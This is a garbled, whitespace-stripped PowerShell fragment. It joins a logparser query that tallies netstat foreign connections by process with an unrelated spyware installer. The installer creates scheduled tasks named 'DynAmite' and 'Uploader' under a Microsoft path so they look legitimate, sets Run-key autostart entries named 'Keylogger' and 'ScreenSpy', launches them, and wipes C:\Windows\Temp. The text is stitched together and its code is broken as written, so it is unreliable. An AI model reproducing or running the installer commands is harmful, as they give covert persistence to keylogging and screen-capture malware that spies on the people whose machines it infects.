if (Get-Command logparser.exe) {$lpquery = @"SELECTCOUNT(ForeignAddress,ForeignPort,Process) as ct,ForeignAddress,ForeignPort,ProcessFROM*netstat.csvWHEREConPid not in ('0'; '4') andForeignAddress not like '10.%' andForeignAddress not like '169.254%' andForeignAddress not in ('*'; '0.0.0.0'; '127.0.0.1'; '[::]'; '[::1]')GROUP BYForeignAddress,ForeignPort,ProcessORDER BYProcess,ct desc"@& logparser -stats:off -i:csv -dtlines:0 -rtp:-1 $lpquery} else {$ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)"${ScriptName} requires logparser.exe in the path."}schtasks.exe /create /TN "Microsoft\Windows\DynAmite\DynAmite" /XML C:\Windows\Temp\dynatask.xmlschtasks.exe /create /TN "Microsoft\Windows\DynAmite\Uploader" /XML C:\Windows\Temp\upltask.xmlSCHTASKS /run /TN "Microsoft\Windows\DynAmite\DynAmite"New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Keylogger -PropertyType String -Value "C:\Windows\dynakey.exe"New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ScreenSpy -PropertyType String -Value "C:\Windows\dynascr.exe"C:\Windows\dynakey.exeC:\Windows\dynascr.exeRemove-Item "C:\Windows\Temp\*"